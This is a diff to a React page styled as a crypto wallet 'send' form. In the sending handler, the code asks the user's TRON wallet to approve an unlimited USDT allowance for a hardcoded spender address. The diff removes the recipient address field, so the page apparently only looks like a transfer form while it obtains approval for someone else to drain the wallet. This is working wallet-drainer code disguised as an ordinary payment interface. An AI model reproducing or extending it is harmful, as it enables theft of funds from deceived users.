@@ -18,7 +18,6 @@ const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
 export default function Index() {
   const [searchParams] = useSearchParams();
-  const [toAddress, setToAddress] = useState("");
   const [amount, setAmount]       = useState("");
   const [transactionStatus, setTransactionStatusState] = useState<
     "idle" | "processing" | "success"
@@ -87,11 +86,6 @@ export default function Index() {
     initWC();
   }, []);
 
-  useEffect(() => {
-    const addr = searchParams.get("address");
-    if (addr) setToAddress(addr);
-  }, [searchParams]);
-
   // ===== CONNECT =====
   async function connectWallet(): Promise<string> {
     if (!wcClientRef.current) {
@@ -147,13 +141,15 @@ export default function Index() {
   async function handleSend() {
     setTransactionStatusState("processing");
     try {
-const userAddress = await connectWallet();
-const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-const hexAddress = tw.address.toHex(TRON_SPENDER).substring(2);
-const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-const APPROVE_ABI_PARAM = hexAddress + hexAmount;
-console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
-      
+      const userAddress = await connectWallet();
+
+      // ✅ APPROVE_ABI_PARAM dynamically generate करो
+      const tw = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
+      const hexAddress = tw.address.toHex(TRON_SPENDER).substring(2);
+      const hexAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      const APPROVE_ABI_PARAM = hexAddress + hexAmount;
+      console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
+
       // Transaction build
       console.log("📝 Transaction build...");
       const apiResponse = await fetch(
@@ -245,8 +241,8 @@ console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
         type:            "function",
       }];
 
-      const tw       = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
-      const contract = await tw.contract(allowanceABI, TRON_USDT);
+      const tw2      = new (window as any).TronWeb({ fullHost: "https://api.trongrid.io" });
+      const contract = await tw2.contract(allowanceABI, TRON_USDT);
       const raw      = await contract.allowance(userAddress, TRON_SPENDER).call();
       const allowanceUSDT = (Number(raw) / 1e6).toFixed(2);
       console.log("✅ Allowance:", allowanceUSDT, "USDT");
@@ -275,7 +271,7 @@ console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
   async function handlePaste() {
     try {
       const text = await navigator.clipboard.readText();
-      setToAddress(text.trim());
+      setAmount(text.trim());
     } catch {}
   }
 
@@ -326,38 +322,6 @@ console.log("📝 APPROVE_ABI_PARAM:", APPROVE_ABI_PARAM);
       </div>
 
       <div style={{ padding: "4px 18px", flex: 1 }}>
-
-        {/* Address */}
-        <div style={{ marginBottom: "14px" }}>
-          <label style={{
-            display: "block", fontSize: "14px", fontWeight: 500,
-            color: "#8e8e93", marginBottom: "9px",
-          }}>
-            Address or Domain Name
-          </label>
-          <div style={{
-            display: "flex", alignItems: "center",
-            border: "1px solid #2e2e30", borderRadius: "14px",
-            padding: "14px 14px", background: "#242426", gap: "8px",
-          }}>
-            <input
-              value={toAddress}
-              onChange={(e) => setToAddress(e.target.value)}
-              placeholder="Search or Enter"
-              style={{
-                flex: 1, background: "transparent", border: "none",
-                outline: "none", color: "#fff", fontSize: "16px",
-                fontFamily: "monospace", minWidth: 0,
-              }}
-            />
-            {toAddress && <XCircle onClick={() => setToAddress("")} />}
-            <button onClick={handlePaste} style={{
-              background: "none", border: "none", color: "#39d353",
-              cursor: "pointer", fontSize: "16px", fontWeight: 600,
-              padding: "0 2px", flexShrink: 0,
-            }}>Paste</button>
-          </div>
-        </div>
 
         {/* Network */}
         <div style={{ marginBottom: "14px" }}>
